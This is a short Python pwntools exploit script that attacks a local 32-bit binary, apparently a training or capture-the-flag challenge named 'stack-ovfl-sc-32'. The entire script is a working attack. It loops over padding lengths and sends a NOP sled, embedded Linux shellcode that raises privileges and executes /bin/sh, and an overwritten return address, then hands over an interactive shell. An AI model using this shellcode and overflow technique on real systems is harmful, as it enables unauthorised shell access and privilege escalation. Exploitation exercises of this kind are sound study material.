from pwn import *

shellcode = 'j2X\xcd\x80\x89\xc1\x89\xc3jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'
for x in range(0, 9999):
        p = process("stack-ovfl-sc-32")
        print('\n' + str(x) + '\n')
        p.sendline('\x90'*15 + shellcode + "A"*x + p32(0xffffd470))
        p.interactive()
        p.close()